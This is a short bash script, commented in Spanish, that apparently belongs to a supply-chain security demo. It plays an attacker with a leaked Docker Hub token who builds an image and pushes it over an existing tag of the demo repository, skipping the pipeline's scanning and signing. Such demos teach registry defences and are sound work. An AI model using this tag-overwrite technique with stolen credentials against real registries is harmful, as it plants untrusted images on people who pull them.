#!/usr/bin/env bash
# El "token filtrado": el atacante sube su imagen al mismo repo de Docker Hub,
# sin pasar por el pipeline. Uso: ./attack.sh <tag>  (p. ej. el tag de la buena)
set -euo pipefail
REPO=${REPO:-docker.io/pabpereza/supply-chain-demo}
TAG=${1:?uso: ./attack.sh <tag>}
docker build -q -t "$REPO:$TAG" attacker/
docker push -q "$REPO:$TAG"
echo "💀 subida $REPO:$TAG (sin escaneo y sin firma)"
